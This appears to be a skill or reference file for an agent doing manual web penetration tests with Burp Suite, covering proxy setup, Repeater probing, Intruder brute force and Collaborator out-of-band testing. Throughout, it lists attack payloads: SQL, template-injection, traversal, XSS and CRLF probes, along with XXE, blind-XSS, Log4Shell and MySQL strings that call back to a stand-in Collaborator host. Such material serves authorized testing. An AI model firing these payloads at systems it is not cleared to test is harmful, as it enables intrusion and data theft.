# Burp manual workflow — Proxy, Repeater, Intruder, Sequencer, Collaborator

## Proxy

### Listeners
- Proxy → Proxy settings → Proxy listeners. Default `127.0.0.1:8080`.
- Bind to all interfaces to proxy another host/VM/mobile device.
- Listener modes: regular, **invisible proxying** (for thick clients that
  don't honor proxy settings — combine with hosts-file redirection), and
  per-listener TLS cert options (per-host generated, self-signed, custom PKCS#12).

### CA certificate
- `http://burpsuite` → "CA Certificate" → import `cacert.der` into the
  browser/OS trust store. Firefox has its own store. Android ≥7 requires the
  cert in the system store (or app pinning bypass via Frida/objection).
- Easiest path: Proxy → **Open browser** (embedded Chromium, pre-trusted,
  pre-proxied).

### Scope
- Target → Scope settings → Include/Exclude by prefix or advanced regex
  (protocol/host/port/file).
- Proxy history filter → "Show only in-scope items"; Proxy settings →
  optionally "drop all out-of-scope requests" to keep noise out entirely.
- Scope drives: history filters, scanner defaults, "Scan everything in scope",
  and extension behavior (many BApps act only in scope).

### Intercept & history
- Intercept is a tampering tool, not a viewing tool — leave it OFF and work
  from HTTP history unless you need to modify in flight.
- Interception rules (Proxy settings) let you intercept only in-scope, only
  requests with parameters, or by header/body regex.
- **WebSockets history** is a separate tab; intercept and modify WS messages
  the same way. Many SPAs do the sensitive operations over WS.
- Right-click any history entry: Send to Repeater (`Ctrl+R`), Send to
  Intruder (`Ctrl+I`), Scan, Copy as curl command, Copy to file (raw request
  for `sqlmap -r`), Request in browser (session-riding PoC).

### Match and replace
Proxy settings → Match and replace rules. Applied to every proxied message.
Uses:
- Add/strip headers globally: `X-Forwarded-For: 127.0.0.1`,
  `X-Original-URL: /admin`, kill `If-Modified-Since` to avoid 304s.
- Swap session cookies to retest as another user.
- Unhide form fields / enable disabled JS features (response body replace).
- Regex supported; separate rule lists for request/response header/body and
  WS messages.

## Repeater

- One tab per hypothesis; rename tabs (double-click) so the trail is readable.
- Change exactly one variable per send; judge by status, **content length**,
  response time, and reflected markers.
- Toolbar: follow redirects (never/on-site/in-scope/always), target override
  (test virtual-host routing / request smuggling by changing target vs Host
  header independently), HTTP/1 vs HTTP/2 toggle (protocol downgrade bugs,
  h2 request smuggling needs the Inspector's kettled-header view).
- Inspector pane decodes params/cookies/headers inline and lets you edit the
  decoded value (auto re-encodes).
- Standard probe set per parameter: `'` `"` `\` (SQL), `{{7*7}}` `${7*7}`
  (SSTI), `../../../../etc/passwd` (traversal), `<s>x` (XSS reflection
  check), `https://<collab>/` (SSRF), `%0d%0aSet-Cookie:x=1` (CRLF).
- IDOR/authz: duplicate the tab, swap the session cookie for a lower-priv
  user, resend, Comparer-diff the two responses. Automate this pattern with
  the Autorize extension.

## Intruder

### Positions
`Add §` wraps the selection; `Auto §` marks all parameter values. The
payload replaces everything between a `§` pair.

### Attack types
| Type | Sets | Behavior | Use |
|---|---|---|---|
| Sniper | 1 | each position fuzzed in turn, others untouched | per-param fuzzing, enumeration |
| Battering ram | 1 | same payload in all positions simultaneously | same value needed twice (param+header) |
| Pitchfork | up to 20 | sets advance in lockstep (row i everywhere) | paired lists: user:pass, id:token |
| Cluster bomb | up to 20 | full cartesian product | brute force user × password |

### Payloads tab
- Types: Simple list, Runtime file (streamed, for huge lists), Numbers
  (from/to/step — IDOR sweeps), Brute forcer (charset × length), Dates,
  Character/Case substitution, Username generator (from "John Smith" →
  jsmith, j.smith, ...), Copy other payload, Extension-provided, Null
  payloads (N copies of nothing — race conditions, token sampling).
- **Processing rules** (applied in order): add prefix/suffix, match/replace,
  encode (URL/HTML/Base64), hash (MD5/SHA), skip if matches regex.
- Payload encoding: by default URL-encodes key chars — disable when payloads
  must land raw (e.g. header injection).

### Settings tab
- **Grep - Match**: flag rows containing strings/regex (`error`, `Welcome`,
  `root:x:`, `Exception`). Flags become sortable columns.
- **Grep - Extract**: define a region (or regex) to pull from each response
  into a column — extract usernames, tokens, account balances. Also powers
  **recursive grep** (feed the extracted value into the next request's
  payload — multi-step token chains).
- Grep - Payloads: detect payload reflection (XSS candidates).
- Redirections: follow + process cookies when fuzzing login flows.
- Resource pool: concurrent request count + optional per-request delay;
  create a 1-thread pool for race-sensitive or lockout-sensitive targets,
  a wide pool for ID sweeps.
- Attack results: sort by Status / Length (anomaly = different length),
  response timer columns reveal time-based blinds.

### Community note
Community Intruder inserts an increasing artificial delay — fine for a
50-row sanity check, useless for brute force. Use **Turbo Intruder** (BApp,
Python-scripted request engine, >10k rps capable, the standard tool for race
conditions via its `gate`/single-packet technique) or external ffuf/hydra.

## Sequencer

Token randomness analysis (session cookies, CSRF tokens, password-reset
tokens):
1. Send a response that issues the token (e.g. the login response's
   Set-Cookie) to Sequencer; it auto-detects cookie/form-field tokens, or
   define a custom location.
2. Start live capture — collect ≥ a few thousand tokens (statistical tests
   need volume; FIPS tests want 20k).
3. Analyze: overall entropy estimate, character- and bit-level tests. Anything
   with low effective entropy, static prefixes, or time-correlated bits is a
   finding (WSTG-SESS-01, CWE-330). Save tokens to file for offline analysis
   (hashcat, custom stats).

## Decoder & Comparer

- Decoder: stacked transforms — decode/encode URL, HTML, Base64, ASCII hex,
  gzip; hash. "Smart decode" guesses. Use for nested encodings
  (base64-in-URL-in-JSON) and for building encoded Intruder payloads.
- Comparer: load two requests/responses, diff by words or bytes. Core uses:
  login response valid-user vs invalid-user (enumeration), authz response
  user-A vs user-B (IDOR), pre/post patch behavior.

## Collaborator (Pro)

- Burp menu → Burp Collaborator client. "Copy to clipboard" yields unique
  subdomains of the Collaborator server (default `*.oastify.com`; Settings →
  Project → Collaborator to run a private server).
- Payload placement by bug class:
  - SSRF: URL params, `url=`, `callback=`, PDF-generator inputs,
    `Host`/`X-Forwarded-Host` headers.
  - XXE: `<!DOCTYPE x [<!ENTITY e SYSTEM "http://<collab>/">]>` and
    parameter-entity OOB exfil variants.
  - Blind XSS: `"><script src=https://<collab>/x></script>` into fields
    rendered in admin/back-office views.
  - Java deserialization: ysoserial **URLDNS** gadget pointed at the
    Collaborator domain — DNS hit proves the deserialization sink with zero
    gadget dependencies.
  - Log4Shell-style JNDI: `${jndi:ldap://<collab>/a}`.
  - Blind SQLi OOB: `LOAD_FILE('\\\\<collab>\\a')` (MySQL/Windows),
    `UTL_HTTP`/`UTL_INADDR` (Oracle).
- Poll now / auto-poll. Interaction record shows type (DNS/HTTP/SMTP),
  timestamp, source IP, and the full inbound request — HTTP interactions can
  carry exfiltrated data in the path/params.
- **DNS-only hit** = the hostname was resolved server-side: the payload
  executed but HTTP egress is filtered. Still a confirmed vuln.
- Correlate hits to injections by using a distinct payload subdomain per
  injection point (the client generates unique ones each copy).

## rupu wiring for manual work

Every session of manual work ends by:
1. `assets.mark` each touched route (`web:route`, depth `tested`, param
   coordinate when a specific parameter was probed).
2. Writing a work-units array for anomalies that need dedicated follow-up
   (hand to the `work-units` skill).
3. `findings.report` for each confirmed issue — full Repeater
   request/response in evidence, WSTG/CWE id. Use the `finding-report` skill.
Exact JSON shapes: `references/rupu.md`.
